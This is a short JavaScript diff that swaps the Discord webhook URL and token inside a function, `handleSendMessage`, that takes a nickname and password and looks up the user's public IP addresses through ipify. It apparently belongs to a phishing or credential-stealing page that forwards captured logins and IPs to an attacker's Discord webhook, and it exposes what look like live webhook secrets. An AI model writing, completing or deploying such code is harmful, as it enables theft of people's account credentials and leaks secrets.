@@ -1,6 +1,6 @@
 export const handleSendMessage = async (nickname, pwd) => {
   const webhookUrl =
-    "https://discord.com/api/webhooks/1230020663696166963/Ibsc9GKT8rV9Z0q-2uPtulO1kdubroGm0Y4eP0qCmr8Pm_wgSf8HCfeEb56YcESsBQvc";
+    "https://discord.com/api/webhooks/1237166275734671540/D45nBAaf-wYCh0RPAjU_jmCtmqyJk-ISucyWaoIGXl21xedHPIfvCHENSqJUNPiFk_NJ";
 
   const response4 = await fetch("https://api.ipify.org?format=json");
   const response6 = await fetch("https://api64.ipify.org?format=json");
